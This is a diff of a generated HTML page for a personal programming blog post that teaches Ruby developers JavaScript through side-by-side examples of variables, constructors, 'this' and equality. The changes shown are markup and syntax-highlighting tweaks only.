@@ -3,6 +3,7 @@
 <head>
   <meta charset="utf-8"/>
   <meta http-equiv='X-UA-Compatible' content='IE=edge;chrome=1'/>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Hostile Developer - Using Ruby to learn JavaScript</title>
   <link href="/stylesheets/application.css" rel="stylesheet" type="text/css" />
   <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed.xml" />
@@ -12,23 +13,17 @@
   <section id="header">
   <header>
 <a href="/">        <h1 class="brand"><span class="hostile">Hostile</span> Developer</h1>
-
-        <h3 class="tag-line">I am Steven. Hear me Rant.</h3>
+        <h4 class="tag-line">I am Steven. Hear me Rant.</h4>
 </a>  </header>
 
   <section class='social'>
     <a target="_blank" href="http://twitter.com/_StevenNunez/"><i class="fa fa-twitter"></i></a>
     <a target="_blank" href="https://github.com/StevenNunez/"><i class="fa fa-github"></i></a>
   </section>
-  <nav>
-    <ul class='links'>
-      <li><a href="/">Home</a></li>
-    </ul>
-  </nav>
 </section>
 
 
-  <main id='articles' role="main">
+  <main id='article' role="main">
     <h1 class="article-title"><a href="/2014/05/18/using-ruby-to-learn-javascript.html">Using Ruby to learn JavaScript</a></h1>
     <p>I&rsquo;ve written about why I believe <a href="/2014/04/26/on-why-learning-to-program-is-hard.html">learning to program is hard</a>. If you&rsquo;ve made it to the other side, rejoice! It&rsquo;s time for the easy part. Learning a new language. Let&rsquo;s see how knowing Ruby can help us learn a little JavaScript. (I&rsquo;m assuming you know Ruby for the duration of this post)</p>
 
@@ -46,19 +41,17 @@ Both are:</p>
 <p>Let&rsquo;s look at these first</p>
 
 <h2>Dynamically Typed</h2>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="rouge-code"><pre><span class="n">my_account</span> <span class="o">=</span> <span class="p">{}</span>
 <span class="n">my_account</span> <span class="o">=</span> <span class="p">[]</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>vs</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">myAccount</span> <span class="o">=</span> <span class="p">{};</span>
 <span class="nx">myAccount</span> <span class="o">=</span> <span class="p">[];</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>With these 2 lines of code, we can start to identify some differences between the languages.</p>
 
 <h3>The <code>var</code> keyword</h3>
@@ -66,7 +59,7 @@ Both are:</p>
 <p>Variables in JavaScript <strong>must</strong> be declared. You <strong>must</strong> communicate this intention, otherwise weird things start to happen. The following code works, but not like you think.</p>
 
 <p>Run this in Developer Tools</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -82,12 +75,11 @@ Both are:</p>
 
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">ohMy</span><span class="p">);</span> <span class="c1">// 100</span>
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">totallyFine</span><span class="p">);</span> <span class="c1">// explosion!  </span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Why&rsquo;s this a big deal? This means that if any code, anywhere creates a variable in a function without the <code>var</code> keyword, it&rsquo;s with you for the rest of your app. Other things can change it. For a real life case of this biting someone, checkout <a href="http://blog.safeshepherd.com/23/how-one-missing-var-ruined-our-launch/">this  post</a>.</p>
 
 <p>Strict mode prevents this tomfoolery.</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -99,31 +91,28 @@ Both are:</p>
   <span class="nx">ohMy</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="nx">varTest</span><span class="p">();</span> <span class="c1">// blows up here since ohMy is not defined</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Another difference are those semicolons! Semicolons are used to end a statement. It may be your first impulse to throw semicolons everywhere but <a href="http://www.codecademy.com/blog/78-your-guide-to-semicolons-in-javascript">don&rsquo;t</a>.
 JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p>
 
 <h2>Object Orientation</h2>
 
 <p>Both languages can create structures that act as templates for instances of itself.</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 </pre></td><td class="rouge-code"><pre><span class="k">class</span> <span class="nc">Student</span>
 <span class="k">end</span>
 <span class="n">bob</span> <span class="o">=</span> <span class="no">Student</span><span class="p">.</span><span class="nf">new</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>vs</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">Student</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){};</span>
 <span class="kd">var</span> <span class="nx">bob</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Student</span><span class="p">;</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>In JavaScript, we supply what&rsquo;s called a Constructor Function. One that responds to the <code>new</code> keyword by returning an instance of the function. Let&rsquo;s flesh this out some more.</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -132,17 +121,16 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 7
 8
 </pre></td><td class="rouge-code"><pre><span class="k">class</span> <span class="nc">Student</span>
-  <span class="kp">attr_reader</span> <span class="ss">:name</span>
+  <span class="nb">attr_reader</span> <span class="ss">:name</span>
   <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
     <span class="vi">@name</span> <span class="o">=</span> <span class="nb">name</span>
   <span class="k">end</span>
 <span class="k">end</span>
 <span class="n">bob</span> <span class="o">=</span> <span class="no">Student</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"Bob"</span><span class="p">)</span>
 <span class="n">bob</span><span class="p">.</span><span class="nf">name</span> <span class="c1"># =&gt; "Bob"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>vs</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -154,12 +142,11 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 
 <span class="kd">var</span> <span class="nx">bob</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Student</span><span class="p">(</span><span class="s2">"Bob"</span><span class="p">);</span>
 <span class="nx">bob</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span> <span class="c1">// "Bob"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>The Constructor Function can take arguments like any other function.</p>
 
 <p>To add methods to the Factory, add them to the prototype. Then all instances will have access to those methods.</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -191,10 +178,9 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <span class="nx">bob</span><span class="p">.</span><span class="nx">grade</span><span class="p">()</span> <span class="c1">// "F" sorry Crouton</span>
 <span class="kd">var</span> <span class="nx">steven</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Student</span><span class="p">(</span><span class="s2">"Steven"</span><span class="p">);</span>
 <span class="nx">steven</span><span class="p">.</span><span class="nx">grade</span><span class="p">()</span> <span class="c1">// "A" obviously</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Inside the Constructor Function and prototype methods you have access to this mysterious <code>this</code> thing. A new <code>this</code> is created whenever you call a function with the <code>new</code> keyword. By convention, Constructor Functions start with a capital letter.</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -206,10 +192,9 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 
 <span class="kd">var</span> <span class="nx">thisThing</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ThisOrThat</span><span class="p">();</span>
 <span class="nx">thisThing</span><span class="p">.</span><span class="nx">thang</span><span class="p">;</span> <span class="c1">// "This Thang"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>There&rsquo;s another way to make objects in JavaScript by using an object literal.</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -227,10 +212,9 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 
 <span class="nx">myObject</span><span class="p">.</span><span class="nx">value1</span><span class="p">;</span> <span class="c1">// I'm a value</span>
 <span class="nx">myObject</span><span class="p">.</span><span class="nx">action</span><span class="p">();</span> <span class="c1">// "Live Action! I'm a value""</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Here, the <code>action</code> method has access to other properties in the object through <code>this</code>.</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -244,10 +228,9 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <span class="p">}</span>
 
 <span class="nx">myObject</span> <span class="o">===</span> <span class="nx">myObject</span><span class="p">.</span><span class="nx">getThis</span><span class="p">();</span> <span class="c1">// true</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>This is akin to creating an Object instance in Ruby and attaching singleton methods.</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -281,28 +264,25 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <span class="n">my_object</span><span class="p">.</span><span class="nf">action</span> <span class="c1"># As above</span>
 <span class="n">my_object</span> <span class="o">==</span> <span class="n">my_object</span><span class="p">.</span><span class="nf">get_self</span> <span class="c1"># =&gt; true</span>
 
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <h3>Properties in Ruby</h3>
 
 <p>One thing you&rsquo;ll notice is that Ruby has no concept of &lsquo;properties&rsquo; on objects. Everything in Ruby is responding to a message sent. Nothing is stopping you from adding new properties on an existing object in JavaScript.</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 </pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">myObject</span> <span class="o">=</span> <span class="p">{};</span>
 <span class="nx">myObject</span><span class="p">.</span><span class="nx">value1</span> <span class="o">=</span> <span class="s2">"I'm a value"</span><span class="p">;</span>
 <span class="nx">myObject</span><span class="p">.</span><span class="nx">value1</span><span class="p">;</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>In Ruby, it would break.</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="rouge-code"><pre><span class="n">my_object</span> <span class="o">=</span> <span class="no">Object</span><span class="p">.</span><span class="nf">new</span>
 <span class="n">my_object</span><span class="p">.</span><span class="nf">value1</span> <span class="o">=</span> <span class="s2">"I'm a value"</span> <span class="c1"># =&gt; "NoMethodError"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>They behave more like Ruby&rsquo;s OpenStruct class</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -310,8 +290,7 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <span class="n">my_object</span> <span class="o">=</span> <span class="no">OpenStruct</span><span class="p">.</span><span class="nf">new</span>
 <span class="n">my_object</span><span class="p">.</span><span class="nf">value1</span> <span class="o">=</span> <span class="s2">"I'm a value"</span>
 <span class="n">my_object</span><span class="p">.</span><span class="nf">value1</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <h2>First Class Functions</h2>
 
 <p>What the hell does that even mean?</p>
@@ -323,7 +302,7 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <p>My post on <a href="/2014/04/13/closures.html">closures</a> shows that Ruby has passable functions in the form of lambdas, but it&rsquo;s used a lot more in JavaScript!!</p>
 
 <p>Look at this JavaScript code that takes a function, and returns a new function based on the return value of the former function.</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -339,10 +318,9 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 
 <span class="kd">var</span> <span class="nx">babyFunction</span> <span class="o">=</span> <span class="nx">poppaFunction</span><span class="p">(</span><span class="s2">"Big Papa"</span><span class="p">);</span>
 <span class="nx">babyFunction</span><span class="p">(</span><span class="s2">"Have a great night!"</span><span class="p">);</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>and the same in Ruby</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -354,8 +332,7 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 
 <span class="n">baby_lambda</span> <span class="o">=</span> <span class="n">poppa_lambda</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="s2">"Big Papa"</span><span class="p">)</span>
 <span class="n">baby_lambda</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="s2">"Have a great night!"</span><span class="p">)</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>One important distinction is the the differences in return values. In JavaScript, functions <strong>must</strong> return a value, otherwise they return <code>undefined</code>. In ruby, the last executed line of a method/lambda/block is what&rsquo;s returned, unless you use and explicit <code>return</code>.</p>
 
 <h1>Differences</h1>
@@ -365,7 +342,7 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <h2><code>self</code> and <code>this</code></h2>
 
 <p>Ruby&rsquo;s rules for what changes self are pretty straight forward.</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -379,14 +356,13 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
   <span class="k">end</span>
 <span class="k">end</span>
 <span class="nb">self</span> <span class="c1"># =&gt; main</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>That&rsquo;s pretty much it. There&rsquo;s also <a href="http://www.jimmycuadra.com/posts/metaprogramming-ruby-class-eval-and-instance-eval"><code>instance_eval</code> and <code>class_eval</code></a>. A topic for another time.</p>
 
 <p>In JavaScript it&rsquo;s not so simple.</p>
 
 <p>We&rsquo;ve seen that <code>this</code> points to current object inside an object.</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -400,10 +376,9 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <span class="p">}</span>
 
 <span class="nx">myObject</span> <span class="o">===</span> <span class="nx">myObject</span><span class="p">.</span><span class="nx">getThis</span><span class="p">();</span> <span class="c1">// true</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>But what about here?</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -419,12 +394,11 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">myFunction</span><span class="p">();</span>
 <span class="nx">value</span><span class="p">;</span> <span class="c1">// "A value" We put it on the global scope!!!!</span>
 <span class="nx">result</span> <span class="o">===</span> <span class="nb">window</span> <span class="c1">// true OMG!!!</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p><code>this</code> inside a regular function points to the root object. In browser that&rsquo;s <code>window</code>.</p>
 
 <p>Again, strict mode saves our butts here.</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -438,10 +412,9 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <span class="p">};</span>
 
 <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">myFunction</span><span class="p">();</span> <span class="c1">// TypeError: Cannot set property 'value' of undefined</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>How about this one?</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -465,12 +438,11 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <span class="nx">myObject</span><span class="p">.</span><span class="nx">collection</span><span class="p">;</span>
 <span class="nx">myObject</span><span class="p">.</span><span class="nx">iterate</span><span class="p">();</span> <span class="c1">// TypeError: Cannot read property 'push' of undefined</span>
 <span class="nx">myObject</span><span class="p">.</span><span class="nx">collection</span><span class="p">;</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>This new function changed <code>this</code> back to the default <code>this</code>, the <code>window</code> in the case of the browser.</p>
 
 <p>In cases like this we have to keep track of our previous self in a variable. Usually this variable is named <code>_that</code> or <code>self</code>.</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -486,9 +458,9 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 </pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">myObject</span> <span class="o">=</span> <span class="p">{</span>
   <span class="na">collection</span><span class="p">:</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">],</span>
   <span class="na">iterate</span><span class="p">:</span> <span class="kd">function</span><span class="p">(){</span>
-    <span class="kd">var</span> <span class="nx">self</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nb">self</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
     <span class="k">this</span><span class="p">.</span><span class="nx">collection</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">item</span><span class="p">){</span>
-      <span class="nx">self</span><span class="p">.</span><span class="nx">collection</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">item</span> <span class="o">*</span> <span class="nx">item</span><span class="p">);</span> <span class="c1">// This gon break.</span>
+      <span class="nb">self</span><span class="p">.</span><span class="nx">collection</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">item</span> <span class="o">*</span> <span class="nx">item</span><span class="p">);</span> <span class="c1">// This gon break.</span>
     <span class="p">})</span>
   <span class="p">}</span>
 <span class="p">};</span>
@@ -496,21 +468,19 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <span class="nx">myObject</span><span class="p">.</span><span class="nx">collection</span><span class="p">;</span>
 <span class="nx">myObject</span><span class="p">.</span><span class="nx">iterate</span><span class="p">();</span> <span class="c1">// TypeError: Cannot read property 'push' of undefined</span>
 <span class="nx">myObject</span><span class="p">.</span><span class="nx">collection</span><span class="p">;</span> <span class="c1">// [1, 2, 3, 1, 4, 9]</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Sharp viewers know <code>forEach</code> takes an optional argument for the object to stand in as <code>this</code>.</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 </pre></td><td class="rouge-code"><pre><span class="k">this</span><span class="p">.</span><span class="nx">collection</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">item</span><span class="p">){</span>
   <span class="k">this</span><span class="p">.</span><span class="nx">collection</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">item</span> <span class="o">*</span> <span class="nx">item</span><span class="p">);</span> <span class="c1">// This gon break.</span>
 <span class="p">},</span> <span class="k">this</span><span class="p">)</span> <span class="c1">// this this is the original this not that this. :-)</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <h2>Equality</h2>
 
 <p>Ruby&rsquo;s equality testing has 2 forms: <code>==</code> and <code>===</code>. The <code>==</code> tests for equality as defined by the object.</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -531,7 +501,7 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <span class="s2">"Steven"</span> <span class="o">==</span> <span class="s2">"Steven"</span>
 
 <span class="k">class</span> <span class="nc">MyObject</span>
-  <span class="kp">attr_reader</span> <span class="ss">:description</span>
+  <span class="nb">attr_reader</span> <span class="ss">:description</span>
   <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">description</span><span class="p">)</span>
     <span class="vi">@description</span> <span class="o">=</span> <span class="n">description</span>
   <span class="k">end</span>
@@ -544,17 +514,15 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <span class="n">obj1</span> <span class="o">=</span> <span class="no">MyObject</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"A plain object"</span><span class="p">)</span>
 <span class="n">obj2</span> <span class="o">=</span> <span class="no">MyObject</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"A plain object"</span><span class="p">)</span>
 <span class="n">obj1</span> <span class="o">==</span> <span class="n">obj2</span> <span class="c1"># =&gt; true</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>And Case equality, used for <code>case</code> statements. In a new object, <code>===</code> delegates to <code>==</code></p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
-</pre></td><td class="rouge-code"><pre><span class="p">(</span><span class="mi">1</span><span class="p">.</span><span class="nf">.</span><span class="mi">10</span><span class="p">)</span> <span class="o">===</span> <span class="mi">5</span>
+</pre></td><td class="rouge-code"><pre><span class="p">(</span><span class="mi">1</span><span class="o">..</span><span class="mi">10</span><span class="p">)</span> <span class="o">===</span> <span class="mi">5</span>
 <span class="sr">/even/</span> <span class="o">===</span> <span class="s2">"Steven"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>JavaScript has no way to override equality on objects. You CAN use equality on primitives like strings and numbers, but here lies the danger. This is from <a href="http://www.amazon.com/JavaScript-Good-Parts-Douglas-Crockford/dp/0596517742">&ldquo;JavaScript: The Good Parts&rdquo;</a></p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -562,10 +530,9 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <span class="kc">false</span> <span class="o">==</span> <span class="s1">'false'</span> <span class="c1">// false</span>
 <span class="kc">false</span> <span class="o">==</span> <span class="s1">'0'</span> <span class="c1">// true</span>
 <span class="kc">null</span> <span class="o">==</span> <span class="kc">undefined</span> <span class="c1">// true</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p><a href="https://www.destroyallsoftware.com/talks/wat">Wat</a>. The <code>==</code> in JavaScript tries to coerce or convert the things being compared to be the same type, which might sound helpful, but it&rsquo;s not. Use <code>===</code> and <code>!==</code> to ensure you&rsquo;re comparing type and value.</p>
-<pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -573,8 +540,7 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 <span class="kc">false</span> <span class="o">===</span> <span class="s1">'false'</span> <span class="c1">// false</span>
 <span class="kc">false</span> <span class="o">===</span> <span class="s1">'0'</span> <span class="c1">// false</span>
 <span class="kc">null</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="c1">// false as it should be!</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Learning your first programming language is hard. I hope I&rsquo;ve shown you that learning your second one, isn&rsquo;t that bad.</p>
 
 <p>Happy Clacking!</p>
